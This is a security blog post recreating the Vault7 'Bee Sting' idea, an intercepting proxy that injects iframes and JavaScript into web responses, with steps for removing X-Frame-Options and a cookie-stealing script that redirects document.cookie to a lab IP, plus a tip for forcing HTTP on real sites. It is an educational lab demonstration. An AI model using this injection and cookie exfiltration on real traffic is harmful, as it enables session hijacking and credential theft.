---
layout: post
title: CIA Bee Sting - Proxy With iFrame Injection
date: '2022-02-24T12:14:00.006-08:00'
author: Matt C
tags: 
modified_time: '2022-03-15T17:21:56.321-07:00'
thumbnail: https://blogger.googleusercontent.com/img/a/AVvXsEh64BsSzkrhrOqI3oQhWJbP3d4kVan_-Vfu-iiBnmzzp7iY0sPRhji9h_YPBb5a062E-YIUyi0Adxoz9nXO0muSMjo26cDNE-dv2t1hgnOFXUECoJDbO6UTM1UuzIKuTj-jpIH2g-ycVJC9ttxm38wXPOzpJ6MEa_Vaaf2UbyjMfUqH9dtDWgblvT5-Gg=s72-w663-c-h230
blogger_id: tag:blogger.com,1999:blog-8951407132095927802.post-7625422113309742488
blogger_orig_url: https://cr.culbertreport.com/2022/02/cia-bee-sting-proxy-with-iframe.html
---

<h2 style="text-align: left;"><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; Intro</span> <br /></span></h2><p><span style="font-size: medium;"><span>&nbsp;&nbsp; &nbsp;</span>Continuing to look through Vault7, we can find Bee Sting. A simple idea, we have a proxy that traffic goes to and fro through and, on certain websites, instead of legitimate responses being returned we send back a modified response which has "reconstructed the IP header and calculated the new checksum, reconstructed the TCP header with the new payload size and calculated the checksum and modified the HTTP protocol content-Length to correlate with the new payload size." This should be invisible to the end user and accomplishes our goal of stealing credentials, sending to a fake download site, or another alternative goal.</span></p><h2 style="text-align: left;"><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; </span>PoC&nbsp; <br /></span></h2><p><span style="font-size: medium;">&nbsp;&nbsp;&nbsp; </span><span style="font-size: medium;">Lets start by breaking down how very simple web requests typically work. Once you get done negotiating the encryption details, your web browser sends a GET request for the websites root directory, typically represented by <span style="font-family: courier;">/index.html</span>. </span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEh64BsSzkrhrOqI3oQhWJbP3d4kVan_-Vfu-iiBnmzzp7iY0sPRhji9h_YPBb5a062E-YIUyi0Adxoz9nXO0muSMjo26cDNE-dv2t1hgnOFXUECoJDbO6UTM1UuzIKuTj-jpIH2g-ycVJC9ttxm38wXPOzpJ6MEa_Vaaf2UbyjMfUqH9dtDWgblvT5-Gg=s896" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="310" data-original-width="896" height="230" src="https://blogger.googleusercontent.com/img/a/AVvXsEh64BsSzkrhrOqI3oQhWJbP3d4kVan_-Vfu-iiBnmzzp7iY0sPRhji9h_YPBb5a062E-YIUyi0Adxoz9nXO0muSMjo26cDNE-dv2t1hgnOFXUECoJDbO6UTM1UuzIKuTj-jpIH2g-ycVJC9ttxm38wXPOzpJ6MEa_Vaaf2UbyjMfUqH9dtDWgblvT5-Gg=w663-h230" width="663" /></a></span></div><p><span style="font-size: medium;"><br /><span>&nbsp;&nbsp;&nbsp; </span>The website responds, if everything has been negotiated correctly, with the website details. We've got a status code "<span style="font-family: courier;">HTTP/2 200 OK</span>" and some additional headers like the content-length.</span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjgtcXiWdoSVDroHRDxmErxNb_Evb4R_FqH07vQBmY89p-Ada4UAhnVLD00UkLI2RJWEF-ddbvzDkAUEu-lN2PdAuG_-ofr5-KJFdYp3mXKrl64SIco85RSd4IX-A7_-C9UkCEM_fOcbDtGz6uY0RjJ_NotULXHoMhXbV1SWmbQsSbbYTScVowMX6PIxg=s887" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="592" data-original-width="887" height="391" src="https://blogger.googleusercontent.com/img/a/AVvXsEjgtcXiWdoSVDroHRDxmErxNb_Evb4R_FqH07vQBmY89p-Ada4UAhnVLD00UkLI2RJWEF-ddbvzDkAUEu-lN2PdAuG_-ofr5-KJFdYp3mXKrl64SIco85RSd4IX-A7_-C9UkCEM_fOcbDtGz6uY0RjJ_NotULXHoMhXbV1SWmbQsSbbYTScVowMX6PIxg=w585-h391" width="585" /></a></span></div><p><span style="font-size: medium;"><br /><span>&nbsp;&nbsp;&nbsp; </span>Here is where we can inject our payload. This type of attack is known as a Cross-Frame Scripting attack. OWASP has a great cheat sheet on this which you can find in <a href="OWASP has a great cheat sheet on this." target="_blank">this link</a>. Well be using their example HTML to construct our example attack. Back on Burp, let's try browsing to <span style="font-family: courier;">culbertreport.com</span> again, but this time let's inject an iFrame.</span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEglqWxj-ZdJjDz5xx7ZaOBMoVBvxZYIaxIdRkYBc0iIpz831pR4DkeItl8Mr4NvL1i4AiiCKqTpv5vqvhYdCY9g4TGNQzG-w4LkggzNDOcQbs15YB5G4tqBkbZsg3woYPZDDEY51LRVn4KVc7EgHuOzfYXUmVxTJoGBhj3NSaoUnZtedcQeaZiyf9PAMg=s903" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="782" data-original-width="903" height="423" src="https://blogger.googleusercontent.com/img/a/AVvXsEglqWxj-ZdJjDz5xx7ZaOBMoVBvxZYIaxIdRkYBc0iIpz831pR4DkeItl8Mr4NvL1i4AiiCKqTpv5vqvhYdCY9g4TGNQzG-w4LkggzNDOcQbs15YB5G4tqBkbZsg3woYPZDDEY51LRVn4KVc7EgHuOzfYXUmVxTJoGBhj3NSaoUnZtedcQeaZiyf9PAMg=w489-h423" width="489" /></a></span></div><p><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; </span>We've now got our iFrame added, only changing the<span style="font-family: courier;"> example.com</span> address to<span style="font-family: courier;"> Google.com</span>. And what does the client get in return? Nothing.</span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEh5EhMKyu2tp0c14Ha48cxLCnLh_gbzhuFejWZANGsuS4ET2rFcBfEo3aE6vTdkCKiM13SKbwMIRFLH9JyvQY3PeyHee7tBrNp5c1ynfvcDYYvprUUbLAM5_Ve5bhGRFOh7IBcbKD589OURYO7fneugy8_QkPQIChOQ-RswkXyCWz-BzLi78wvtS02Zig=s920" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="624" data-original-width="920" height="344" src="https://blogger.googleusercontent.com/img/a/AVvXsEh5EhMKyu2tp0c14Ha48cxLCnLh_gbzhuFejWZANGsuS4ET2rFcBfEo3aE6vTdkCKiM13SKbwMIRFLH9JyvQY3PeyHee7tBrNp5c1ynfvcDYYvprUUbLAM5_Ve5bhGRFOh7IBcbKD589OURYO7fneugy8_QkPQIChOQ-RswkXyCWz-BzLi78wvtS02Zig=w508-h344" width="508" /></a></span></div><p><span style="font-size: medium;"><br /><span>&nbsp;&nbsp; </span>Google refused to allow us to add them in an iFrame. What can we do here to get around this? Google uses a header feature called <span style="font-family: courier;">X-Frame-Options: SAMEORIGIN w</span>hich prevents us from embedding their site in an iFrame. If you're curious, you can <a href="https://auth0.com/blog/preventing-clickjacking-attacks/" target="_blank">read more about them here</a>. <br /></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEi6Yz4yZ_Vmr91WVMwGybRbAdhZZCo1ANAKaqNNQrBCUFKFMCBw78hibCqWgEFHgJUh2z3KYffrqi8vwWtfCj4t2OAIDhbWLSlMBqoyhmy4K7xLUwlEkFsjSKf6l7glJ3JZ3d8pZeGbNqpgcm5Pm1ioAQFq4sUZxR8Q5Qsht3yDybCKAYe7uQmkYAC8Iw=s848" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="694" data-original-width="848" height="414" src="https://blogger.googleusercontent.com/img/a/AVvXsEi6Yz4yZ_Vmr91WVMwGybRbAdhZZCo1ANAKaqNNQrBCUFKFMCBw78hibCqWgEFHgJUh2z3KYffrqi8vwWtfCj4t2OAIDhbWLSlMBqoyhmy4K7xLUwlEkFsjSKf6l7glJ3JZ3d8pZeGbNqpgcm5Pm1ioAQFq4sUZxR8Q5Qsht3yDybCKAYe7uQmkYAC8Iw=w506-h414" width="506" /></a></span></div><p><span style="font-size: medium;"><br /><span>&nbsp;&nbsp;&nbsp; </span>So let's remove that. Viola! Once we removed that annoying header, we were able to embed their website in an iFrame overlaying our own site. <br /></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEgxeChROTshHo9EFUj5BlilJcu8ppXcMRg7Akt28b3tKkfKfSIhhsvXJtgl6NTTUswnJTC91cdJGI4PA6LmfwhRuBzg51B5qobatWMxeLA7PXFmlDeTRYVq9ziRSJvudu5purvqdrqJOIdogLhZrNQ0lapRWkgBC8B0U4S6IbFia-BIv-lVSYUW7SI5ow=s919" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="624" data-original-width="919" height="351" src="https://blogger.googleusercontent.com/img/a/AVvXsEgxeChROTshHo9EFUj5BlilJcu8ppXcMRg7Akt28b3tKkfKfSIhhsvXJtgl6NTTUswnJTC91cdJGI4PA6LmfwhRuBzg51B5qobatWMxeLA7PXFmlDeTRYVq9ziRSJvudu5purvqdrqJOIdogLhZrNQ0lapRWkgBC8B0U4S6IbFia-BIv-lVSYUW7SI5ow=w518-h351" width="518" /></a></span></div><p><span style="font-size: medium;"></span></p><h2 style="text-align: left;">Test Proxy<br /></h2><p><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; We've shown how to add an iFrame to a request and how to circumvent preventive measures. The next step is to automate this so that any web request returning 200 OK gets our code added on to it. For this, <span style="font-family: courier;">mitmproxy </span>does a lot of what we want right out of the box. There's <a href="https://www.thepythoncode.com/article/writing-http-proxy-in-python-with-mitmproxy" target="_blank">good examples here</a> and we'll be referencing them. The code is fairly simple, we'll be using <span style="font-family: courier;">mitmproxy </span>to inject some javascript into any HTTP page that's loaded through it. <br /></span></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"></span></div><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"></span></div><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEi5GFItijl_ZB4RglhctcoL_5olWkDVBEMP47SWq6EuO3NpP_-k-ycloTtZlcL4CweZxEMNy49VEmzVvaCpQgb3L1kbXPxvyAiE8_xZDAgc5eAop0udsG0pzgzRZ1Tnotp9Y7y10oGVxX0ZWYlzEOujLwyK-evLHk_ZCIz8O9ntlF0rxvZWr4BylwCruQ=s789" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="285" data-original-width="789" height="186" src="https://blogger.googleusercontent.com/img/a/AVvXsEi5GFItijl_ZB4RglhctcoL_5olWkDVBEMP47SWq6EuO3NpP_-k-ycloTtZlcL4CweZxEMNy49VEmzVvaCpQgb3L1kbXPxvyAiE8_xZDAgc5eAop0udsG0pzgzRZ1Tnotp9Y7y10oGVxX0ZWYlzEOujLwyK-evLHk_ZCIz8O9ntlF0rxvZWr4BylwCruQ=w512-h186" width="512" /></a></span></div><p><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; </span>This will append our OVERLAY_JS to the end of any webpage that's loaded. Now, if we start <span style="font-family: courier;">mitmproxy </span>with the <span style="font-family: courier;">-s</span> flag, pass <span style="font-family: courier;">proxy.py</span> to it, and route our browser through it, we'll see our new alert. <br /></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEhuW1_LrtgiUbe9lQUHyMKRKlvugzTk_0_YKaPs31OlQHGnzjKpwR4ETOUvc9A_zSfxn5DtSOrWAim7OSh23BsSVyFFa9aUAN9NvYJe4uLpJU1HrGGxOtg3VxLMKBMPqdNPojJTtUnzdHX5IuVU9ayORDUUxI6eTK_MlFVkYk_OzsswLeUF-0X2QSMJrg=s1614" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="713" data-original-width="1614" height="281" src="https://blogger.googleusercontent.com/img/a/AVvXsEhuW1_LrtgiUbe9lQUHyMKRKlvugzTk_0_YKaPs31OlQHGnzjKpwR4ETOUvc9A_zSfxn5DtSOrWAim7OSh23BsSVyFFa9aUAN9NvYJe4uLpJU1HrGGxOtg3VxLMKBMPqdNPojJTtUnzdHX5IuVU9ayORDUUxI6eTK_MlFVkYk_OzsswLeUF-0X2QSMJrg=w637-h281" width="637" /></a></span><br /></div><p><span style="font-size: medium;"><span>&nbsp;&nbsp;&nbsp; </span>Javascript can do a lot more than just create annoying pop-up windows though, so let's try something more interesting and steal some pretend cookies. Cookie stealers are a common attack deployed in the wild. Google wrote up <a href="https://www.hackread.com/google-cookie-stealer-malware-hit-youtubers/" target="_blank">a detailed post </a>on a campaign from October 2021 that targeted YouTube creators, Kaspersky found <a href="https://securelist.com/cookiethief/96332/" target="_blank">a campaign in 2020</a> that was targeting Android devices, and ZDNet analyzed <a href="https://www.zdnet.com/article/cyber-espionage-group-uses-chrome-extension-to-infect-victims/" target="_blank">a North Korean APT back in 2018</a> that was stealing cookies and passwords with a Chrome extension. For our pretend site, we'll use the default Apache2 page and add a little line at the bottom <span style="font-family: courier;">&nbsp;</span></span></p><p><span style="font-size: medium;"><span style="font-family: courier;">&lt;script&gt;document.cookie = "username=Null Byte";&lt;/script&gt;</span></span></p><p><span style="font-size: medium;"><span style="font-family: courier;"></span></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEiCnj2RICpvcC8jsorbVzySDEPr11gDrhlBF77StTjEkq65EZyBukTkqjg0kTPOs5o6RIEvwN4U6yHpRn9o2zKbSRWM1ZOexuesbp1I7Pyz0wlBVFCfbg3aFAx8l6w11ezhRkcw4EUsoGcaF8EzDgjb4RxduyS_KPZXE4mjEoalt5cHzZZ1-PdHGXNN1A=s854" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="463" data-original-width="854" height="269" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCnj2RICpvcC8jsorbVzySDEPr11gDrhlBF77StTjEkq65EZyBukTkqjg0kTPOs5o6RIEvwN4U6yHpRn9o2zKbSRWM1ZOexuesbp1I7Pyz0wlBVFCfbg3aFAx8l6w11ezhRkcw4EUsoGcaF8EzDgjb4RxduyS_KPZXE4mjEoalt5cHzZZ1-PdHGXNN1A=w498-h269" width="498" /></a></span></div><p></p><p><span style="font-size: medium;"><span style="font-family: courier;">&nbsp;</span><span>&nbsp;&nbsp;&nbsp; </span><span>This just passes our static username variable in a cookie to anyone who visits. Next we'll adjust the javascript payload in our proxy to something designed to steal this.&nbsp;</span></span></p><p><span style="font-size: medium;"><span><span style="font-family: courier;">&lt;script&gt; document.location='http://192.168.202.141?c='+document.cookie;&lt;/script&gt;<span></span></span></span><span>&nbsp;</span></span></p><p><span style="font-size: medium;"><span><span>&nbsp;&nbsp; &nbsp;</span>Then we'll just use Pythons simple http.server module on the receiving host to print out the cookie.</span><span><span style="font-family: courier;"><span><span> <span style="font-size: large;"><span style="font-family: georgia;">Now when we browse to the site again, our cookie gets stolen.</span></span></span> <br /></span></span></span></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-size: medium;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEhCR4MNDv4Hv7ARwv-hm1UuCl35mySAHtBAXQz_6vB_OOR-rvccuNBLU20MvMtgUmUfT62s9vjkuoH2h1loJWTnltDMJ7RWjnQD0jKtXkJnve0-XEMdV961JxS0XZLpyEhpi6JJdYiYzT9yTF6DjUT9istI39eumdpShqRYhKlW5q7VQ4oWDyh-s9rySg=s814" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="70" data-original-width="814" height="52" src="https://blogger.googleusercontent.com/img/a/AVvXsEhCR4MNDv4Hv7ARwv-hm1UuCl35mySAHtBAXQz_6vB_OOR-rvccuNBLU20MvMtgUmUfT62s9vjkuoH2h1loJWTnltDMJ7RWjnQD0jKtXkJnve0-XEMdV961JxS0XZLpyEhpi6JJdYiYzT9yTF6DjUT9istI39eumdpShqRYhKlW5q7VQ4oWDyh-s9rySg=w586-h52" width="586" /></a></span></div><span style="font-size: medium;"> </span><span style="font-size: medium;"><span><span style="font-family: courier;"><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjRvMp4rBdPYWX6rKQTHiUV9d-Y71bmbMn0QWkpZEO7rsqtVUDlV3wb6Nu_rEBZt0-Yhs0Q4CbxWXyfaIpuOyGqjoiwdXOqjrwOjVbbvwqWCkTHfksjs69MfId9JJNlh70ruzsL4VfjJXGSczys6iDjORTQUlzJjlOv_q51NPOfrgGF2zX6nmbLd15yKA=s718" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="203" data-original-width="718" height="151" src="https://blogger.googleusercontent.com/img/a/AVvXsEjRvMp4rBdPYWX6rKQTHiUV9d-Y71bmbMn0QWkpZEO7rsqtVUDlV3wb6Nu_rEBZt0-Yhs0Q4CbxWXyfaIpuOyGqjoiwdXOqjrwOjVbbvwqWCkTHfksjs69MfId9JJNlh70ruzsL4VfjJXGSczys6iDjORTQUlzJjlOv_q51NPOfrgGF2zX6nmbLd15yKA=w536-h151" width="536" /></a> <br /></div></span></span></span><p></p><p><span style="font-size: medium;"><span><span style="font-family: courier;">&nbsp;</span></span></span><span>&nbsp;&nbsp; </span><span><span style="font-size: medium;"><span><span style="font-size: medium;">If you want to try this on a real site, you can force it to negotiate in HTTP by stripping the <span style="font-family: courier;">Upgrade-Insecure-Requests</span> header, but this is a little heavy handed and obvious to end users if you wanted to use this in an engagement. </span></span>If you want to take this a step further, you can look at how mitmproxy handles SSL/TLS because the <a href="https://github.com/mitmproxy/mitmproxy" target="_blank">documentation for it outlines that this is supported</a> for web requests. For now though, this was a fun proof of concept. We didn't fully implement the CIAs vision in this example, but javascript can accomplish the same thing as an iFrame so it is a fairly close comparison.</span><br /></span></p><p></p>